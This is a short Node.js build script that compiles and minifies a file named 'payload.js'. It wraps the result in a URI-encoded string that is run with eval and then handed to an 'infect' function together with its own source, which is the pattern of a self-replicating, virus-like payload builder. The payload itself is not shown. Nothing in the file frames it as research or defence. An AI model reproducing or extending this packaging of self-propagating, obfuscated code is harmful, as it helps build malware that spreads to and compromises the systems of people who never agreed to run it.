const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;


async function build() {

    var src = "payload.js";
    var compiled = ".build/payload.compiled.js";
    var minified = ".build/payload.min.js";
        
    var tgt = "payload.built.js";

    await fs.ensureDir( ".build" );
    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
    await exec( `./node_modules/.bin/uglifyjs --compress -o ${minified} ${compiled}` );

    var raw = await fs.readFile( minified, "utf-8" );
    await fs.writeFile( tgt, `(function() {
        var payload = "${encodeURI(raw)}";
        eval( decodeURI(payload) );
        infect(payload);
    })();` );
}

build();
